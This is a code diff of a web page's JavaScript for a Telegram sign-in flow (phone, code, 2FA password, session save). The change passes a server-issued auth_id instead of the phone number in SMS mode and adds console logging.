@@ -453,6 +453,8 @@
     <script>
         const API_BASE = '';
         let currentLoginVia = 'telegram_sms';  // Трекер режима авторизации
+        let currentAuthId = null;               // auth_id для SMS режима
+        let currentPhone = null;                // phone для telegram_message режима
 
         // ==================== Управление этапами ====================
         function showStage(stageName) {
@@ -529,8 +531,17 @@
                     return;
                 }
 
-                // Сохранить режим авторизации
+                // Сохранить режим авторизации и необходимые параметры
                 currentLoginVia = data.login_via || 'telegram_sms';
+                currentPhone = phone;
+
+                if (currentLoginVia === 'telegram_sms') {
+                    // SMS режим - сохранить auth_id из ответа
+                    currentAuthId = data.auth_id;
+                    console.log('📱 SMS режим. auth_id:', currentAuthId);
+                }
+                // При telegram_message auth_id не требуется (используется phone)
+
                 const modeMsg = currentLoginVia === 'telegram_message' ? 'Код отправлен в Telegram' : 'Код отправлен на Telegram';
                 showToast(modeMsg, 'success');
                 showStage('code');
@@ -542,7 +553,6 @@
 
         // ==================== Этап 2: Код верификации ====================
         document.getElementById('btn-send-code').addEventListener('click', async () => {
-            const phone = document.getElementById('phone').value.trim();
             const code = document.getElementById('code').value.trim();
 
             if (!code || code.length < 5) {
@@ -553,16 +563,31 @@
             disableButton('btn-send-code');
 
             try {
-                // Выбрать эндпоинт в зависимости от режима авторизации
-                const endpoint = currentLoginVia === 'telegram_message'
-                    ? `${API_BASE}/api/auth/login-by-telegram`
-                    : `${API_BASE}/api/auth/submit-code`;
+                let endpoint, payload;
+
+                if (currentLoginVia === 'telegram_message') {
+                    // Режим telegram_message: используем auth_id не требуется, только phone и code
+                    endpoint = `${API_BASE}/api/auth/login-by-telegram`;
+                    payload = {
+                        phone: currentPhone,
+                        code: code
+                    };
+                    console.log('📨 Отправляю запрос через telegram_message режим');
+                } else {
+                    // Режим telegram_sms: используем auth_id вместо phone
+                    endpoint = `${API_BASE}/api/auth/submit-code`;
+                    payload = {
+                        auth_id: currentAuthId,
+                        code: code
+                    };
+                    console.log('📱 Отправляю запрос через SMS режим. auth_id:', currentAuthId);
+                }
 
                 const response = await fetch(endpoint, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     credentials: 'include',
-                    body: JSON.stringify({ phone, code })
+                    body: JSON.stringify(payload)
                 });
 
                 const data = await response.json();
@@ -595,7 +620,7 @@
                         showToast('Код принят, сохраняю сессию...', 'info');
                         // Сохранить сессию
                         try {
-                            await saveSession(phone);
+                            await saveSession();
                         } catch (saveError) {
                             console.error('Ошибка при сохранении сессии:', saveError);
                             showToast(getErrorMessage(saveError, 'Ошибка сохранения сессии'), 'error');
@@ -611,7 +636,6 @@
 
         // ==================== Этап 3: Пароль 2FA ====================
         document.getElementById('btn-send-password').addEventListener('click', async () => {
-            const phone = document.getElementById('phone').value.trim();
             const password = document.getElementById('password').value;
 
             if (!password) {
@@ -622,11 +646,15 @@
             disableButton('btn-send-password');
 
             try {
+                // Используем auth_id для SMS режима
                 const response = await fetch(`${API_BASE}/api/auth/submit-password`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     credentials: 'include',
-                    body: JSON.stringify({ phone, password })
+                    body: JSON.stringify({
+                        auth_id: currentAuthId,
+                        password: password
+                    })
                 });
 
                 const data = await response.json();
@@ -641,7 +669,7 @@
 
                 // Сохранить сессию
                 try {
-                    await saveSession(phone);
+                    await saveSession();
                 } catch (saveError) {
                     console.error('Ошибка при сохранении сессии:', saveError);
                     showToast(getErrorMessage(saveError, 'Ошибка сохранения сессии'), 'error');
@@ -654,13 +682,16 @@
         });
 
         // ==================== Сохранение сессии ====================
-        async function saveSession(phone) {
+        async function saveSession() {
             try {
+                // Используем auth_id для SMS режима (telegram_message не требует save)
                 const response = await fetch(`${API_BASE}/api/auth/save`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     credentials: 'include',
-                    body: JSON.stringify({ phone })
+                    body: JSON.stringify({
+                        auth_id: currentAuthId
+                    })
                 });
 
                 const data = await response.json();
